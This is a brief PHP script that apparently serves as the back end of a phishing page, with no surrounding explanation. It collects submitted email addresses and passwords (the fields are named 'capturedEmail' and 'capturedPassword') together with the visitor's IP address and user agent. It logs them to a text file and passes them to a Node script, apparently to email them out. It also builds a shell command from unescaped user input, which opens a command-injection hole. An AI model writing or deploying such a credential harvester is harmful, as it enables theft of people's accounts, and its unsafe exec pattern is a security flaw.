<?php
$ip = $_SERVER['HTTP_X_NF_CLIENT_CONNECTION_IP'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$email = $_POST['capturedEmail'];
$password = $_POST['capturedPassword'];
$details = "IP: " . $ip . "\nUser Agent: " . $userAgent . "\nEmail: " . $email . "\nPassword: " . $password;
file_put_contents('visitor_log.txt', date('Y-m-d H:i:s') . " - " . $details . "\n", FILE_APPEND);
exec('node sendEmail.js "' . $details . '"');
?>
